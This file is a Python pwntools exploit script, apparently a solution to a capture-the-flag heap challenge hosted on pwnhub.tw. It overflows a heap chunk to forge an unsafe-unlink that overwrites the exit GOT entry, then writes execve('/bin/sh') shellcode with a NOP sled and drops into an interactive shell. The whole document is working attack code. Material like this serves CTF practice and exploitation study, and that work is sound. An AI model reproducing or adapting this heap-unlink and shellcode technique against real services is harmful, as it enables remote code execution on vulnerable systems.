#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888
host = "pwnhub.tw"
port = 19008
r = remote(host,port)


def allocate(size):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))

def free(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def show(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def fill(idx,data):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(data)
context.arch = "amd64"
exit_got = 0x602078
allocate(0x30)
allocate(0x30)
allocate(0x30)
free(1)
fd = exit_got - 0x18
bk = 0x41410090
fill(0,"a"*0x30 + p64(0) + p64(0x40) + p64(fd) + p64(bk) )
sc = asm("""
    jmp sc_start
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
sc_start :
    jmp sh 
exec:
    pop rdi
    xor rsi,rsi
    xor rdx,rdx
    mov rax,0x3b
    syscall

    mov rax,0x3c
    syscall

sh :
    call exec 
    .ascii "/bin/sh"
    .byte 0
""")
fill(2,sc)
allocate(0x30) # trigger unlink
r.interactive()
